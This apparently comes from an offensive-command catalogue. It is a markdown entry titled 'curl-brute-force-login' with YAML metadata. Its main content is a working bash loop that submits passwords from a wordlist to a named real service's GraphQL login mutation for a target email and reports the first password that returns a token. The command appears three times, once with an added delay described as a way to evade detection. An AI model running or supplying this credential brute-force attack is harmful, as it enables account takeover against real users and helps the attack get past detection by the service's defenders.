---
id: cmd-uuid-003
data: >-
  while read pass; do curl -X POST https://dubsmash.com/graphql -H
  "Content-Type: application/json" -d '{"query":"mutation LogInUser($input:
  LogInUserInput!) { logInUser(input: $input) { ... on LogInUserSuccess { token
  } }
  }","variables":{"input":{"email":"target@gmail.com","password":"$pass","client_id":"client_id","client_secret":"client_secret"}}}'
  -c cookies.txt -s | grep -q "token"; if [ $? -eq 0 ]; then echo "Success:
  $pass"; break; fi; done < weak_passwords.txt
tags:
  - brute-force
  - graphql
type: command
output: Echoes successful password upon match.
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:33:24.264Z'
verified: false
validated: true
submitted: true
---
# curl-brute-force-login

## Command

```bash
while read pass; do curl -X POST https://dubsmash.com/graphql -H "Content-Type: application/json" -d '{"query":"mutation LogInUser($input: LogInUserInput!) { logInUser(input: $input) { ... on LogInUserSuccess { token } } }","variables":{"input":{"email":"target@gmail.com","password":"$pass","client_id":"client_id","client_secret":"client_secret"}}}' -c cookies.txt -s | grep -q "token"; if [ $? -eq 0 ]; then echo "Success: $pass"; break; fi; done < weak_passwords.txt
```

## Description

Brute-forces GraphQL login by iterating a password wordlist until success.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `while read pass` | Reads passwords from file | Yes |
| `curl ... -d '...$pass...'` | Injects password into payload | Yes |
| `grep -q "token"` | Checks for success indicator | Yes |
| `< weak_passwords.txt` | Input wordlist file | Yes |

## Examples

### Basic Usage

```bash
while read pass; do curl -X POST https://dubsmash.com/graphql -H "Content-Type: application/json" -d '{"query":"mutation LogInUser($input: LogInUserInput!) { logInUser(input: $input) { ... on LogInUserSuccess { token } } }","variables":{"input":{"email":"target@gmail.com","password":"$pass","client_id":"client_id","client_secret":"client_secret"}}}' -s | grep -q "token"; if [ $? -eq 0 ]; then echo "Success: $pass"; break; fi; done < weak_passwords.txt
```

### Advanced Usage

Add delay to evade detection:

```bash
while read pass; do curl ... | grep -q "token"; if [ $? -eq 0 ]; then echo "Success: $pass"; break; fi; sleep 1; done < weak_passwords.txt
```

## Expected Output

"Success: [password]" when match found; otherwise, continues until list end.

## Related

- [[commands/curl-valid-login]]
- [[procedures/Exploit-Weak-Password-Policy-for-Brute-Force]]
